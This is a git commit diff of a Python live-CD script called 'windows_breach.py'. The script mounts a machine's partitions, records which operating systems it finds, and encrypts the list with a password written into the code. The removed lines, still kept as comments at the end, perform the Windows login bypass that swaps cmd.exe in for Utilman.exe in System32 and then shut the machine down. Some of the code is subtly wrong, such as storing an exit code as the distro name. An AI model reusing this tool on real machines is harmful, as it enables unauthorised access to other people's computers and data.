d54b92b303b59075e56e1ed7ae9ff36a93e55509
olivier <o.lespagnon@gmail.com>
2020-07-03 15:23:22 +0200

    add os_scanner

--- live_cd_scripts/windows_breach.py
+++ live_cd_scripts/windows_breach.py
@@ -2,9 +2,15 @@
 # -*- coding: utf-8 -*-
 import sys
 import os
+import json
+import pyAesCrypt
 
+os.system('loadkeys fr')
 os.system('lsblk > result.txt')
-os.system('mkdir /mnt/Windows')
+if os.path.exists('/media/mount/targetDrive'):
+    pass
+else:
+    os.system('mkdir /media/mount/targetDrive')
 
 
 def parse(file_name):
@@ -15,27 +21,44 @@ def parse(file_name):
             for item in temp_arr:
                 if '└─' in item or '├─' in item:
                     result.append(item.replace('└─', '').replace('├─', ''))
+    os.remove(file_name)
     return result
 
 
-def look_for_windows(list):
+def check_for_os(list):
+    os_list = {}
     for drive in drives_list:
-        os.system('mount /dev/%s /mnt/Windows' % (drive))
-        print('Checking for Windows on '+drive+'...\n')
-        if os.path.isdir('/mnt/Windows/Windows'):
-            print('Found Windows in '+drive+' and mounted it at /mnt/Windows')
-            return drive
-    return False
+        os.system('mount /dev/%s /media/mount/targetDrive' % (drive))
+        print('Looking for OS on '+drive+'...\n')
+        if os.path.isdir('/media/mount/targetDrive/Windows'):
+            os_list['Windows'] = drive
+        elif os.path.isdir('/media/mount/targetDrive/etc'):
+            distro = os.system('cat /media/mount/targetDrive/etc/issue')
+            os_list[distro] = drive
+    return os_list
 
 
 drives_list = parse("result.txt")
-if look_for_windows(drives_list):
-    os.system(
-        'mv /mnt/Windows/Windows/System32/Utilman.exe /mnt/Windows/Windows/System32/Utilman.bak')
-    os.system(
-        'mv /mnt/Windows/Windows/System32/cmd.exe /mnt/Windows/Windows/System32/Utilman.exe')
-    print('cmd.exe modified. Rebooting now')
-else:
-    print('no windows found on this machine, don\'t forget to take out the flash drive')
+os_list = check_for_os(drives_list)
 
-os.system('shutdown now')
+# Saving as json file
+json = json.dumps(os_list)
+f = open('os_list.json', 'x')
+f.write(json)
+f.close()
+bufferSize = 64 * 1024
+password = 'ApplePy'
+pyAesCrypt.encryptFile(
+    "os_list.json", 'os_list.json.aes', password, bufferSize)
+os.remove('os_list.json')
+os.remove('live_cd_scripts/result.txt')
+# if check_for_os(drives_list):
+#     os.system(
+#         'mv /mnt/targetDrive/Windows/System32/Utilman.exe /mnt/targetDrive/Windows/System32/Utilman.bak')
+#     os.system(
+#         'mv /mnt/targetDrive/Windows/System32/cmd.exe /mnt/targetDrive/Windows/System32/Utilman.exe')
+#     print('cmd.exe modified. Rebooting now')
+# else:
+#     print('No Operating system found on the disk !')
+
+# os.system('shutdown now')
